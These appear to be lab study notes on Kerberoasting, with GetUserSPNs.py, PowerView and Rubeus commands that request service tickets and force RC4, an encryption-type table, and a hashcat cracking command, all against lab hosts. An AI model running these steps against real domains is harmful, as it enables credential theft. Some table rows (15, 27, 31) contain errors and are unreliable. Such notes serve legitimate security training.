```shell-session
Orbixio@htb[/htb]$ GetUserSPNs.py -dc-ip 192.168.110.55 painters.htb/riley
Orbixio@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 
Orbixio@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
Orbixio@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```

```powershell-session
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> Get-DomainUser * -spn | select samaccountname
PS C:\htb> Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

PS C:\htb> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

```powershell-session
PS C:\htb> .\Rubeus.exe kerberoast /stats
PS C:\htb>  .\Rubeus.exe kerberoast /user:testspn /nowrap
PS C:\htb> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

> [!NOTE] Prioritizing Cracking
> Use Rubeus to request tickets for accounts with the `admincount` attribute set to `1`. These would likely be high-value targets and worth our initial focus for offline cracking efforts with Hashcat.

### Encryption Types

```powershell-session
# Getting supported ETypes for a user
PS C:\htb> Get-DomainUser <username> -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```

| **Decimal Value** | **Hex Value** | **Supported Encryption Types**                                                       |
| ----------------- | ------------- | ------------------------------------------------------------------------------------ |
| 0                 | 0x0           | Not defined - defaults to RC4_HMAC_MD5                                               |
| 1                 | 0x1           | DES_CBC_CRC                                                                          |
| 2                 | 0x2           | DES_CBC_MD5                                                                          |
| 3                 | 0x3           | DES_CBC_CRC, DES_CBC_MD5                                                             |
| 4                 | 0x4           | RC4                                                                                  |
| 5                 | 0x5           | DES_CBC_CRC, RC4                                                                     |
| 6                 | 0x6           | DES_CBC_MD5, RC4                                                                     |
| 7                 | 0x7           | DES_CBC_CRC, DES_CBC_MD5, RC4                                                        |
| 8                 | 0x8           | AES 128                                                                              |
| 9                 | 0x9           | DES_CBC_CRC, AES 128                                                                 |
| 10                | 0xA           | DES_CBC_MD5, AES 128                                                                 |
| 11                | 0xB           | DES_CBC_CRC, DES_CBC_MD5, AES 128                                                    |
| 12                | 0xC           | RC4, AES 128                                                                         |
| 13                | 0xD           | DES_CBC_CRC, RC4, AES 128                                                            |
| 14                | 0xE           | DES_CBC_MD5, RC4, AES 128                                                            |
| 15                | 0xF           | DES_CBC_CBC, DES_CBC_MD5, RC4, AES 128                                               |
| 16                | 0x10          | AES 256                                                                              |
| 17                | 0x11          | DES_CBC_CRC, AES 256                                                                 |
| 18                | 0x12          | DES_CBC_MD5, AES 256                                                                 |
| 19                | 0x13          | DES_CBC_CRC, DES_CBC_MD5, AES 256                                                    |
| 20                | 0x14          | RC4, AES 256                                                                         |
| 21                | 0x15          | DES_CBC_CRC, RC4, AES 256                                                            |
| 22                | 0x16          | DES_CBC_MD5, RC4, AES 256                                                            |
| 23                | 0x17          | DES_CBC_CRC, DES_CBC_MD5, RC4, AES 256                                               |
| 24                | 0x18          | AES 128, AES 256                                                                     |
| 25                | 0x19          | DES_CBC_CRC, AES 128, AES 256                                                        |
| 26                | 0x1A          | DES_CBC_MD5, AES 128, AES 256                                                        |
| 27                | 0x1B          | DES_CBC_MD5, DES_CBC_MD5, AES 128, AES 256                                           |
| 28                | 0x1C          | RC4, AES 128, AES 256                                                                |
| 29                | 0x1D          | DES_CBC_CRC, RC4, AES 128, AES 256                                                   |
| 30                | 0x1E          | DES_CBC_MD5, RC4, AES 128, AES 256                                                   |
| 31                | 0x1F          | DES_CBC_CRC, DES_CBC_MD5, RC4-HMAC, AES128-CTS-HMAC-SHA1-96, AES256-CTS-HMAC-SHA1-96 |
> [!NOTE] Don't have Time?
> While it is possible to crack AES-128 (type 17) and AES-256 (type 18) TGS tickets using [Hashcat](https://github.com/hashcat/hashcat/pull/1955), it will typically be significantly more time consuming than cracking an RC4 (type 23) encrypted ticket, but still possible especially if a weak password is chosen.

We can use Rubeus with the `/tgtdeleg` flag to specify that we want only RC4 encryption when requesting a new service ticket. The tool does this by specifying RC4 encryption as the only algorithm we support in the body of the TGS request.
```
PS C:\htb> .\Rubeus.exe kerberoast /tgtdeleg /user:testspn /nowrap
```
#### Cracking TGS Ticket
```shell-session
Orbixio@htb[/htb]$ hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt 
```
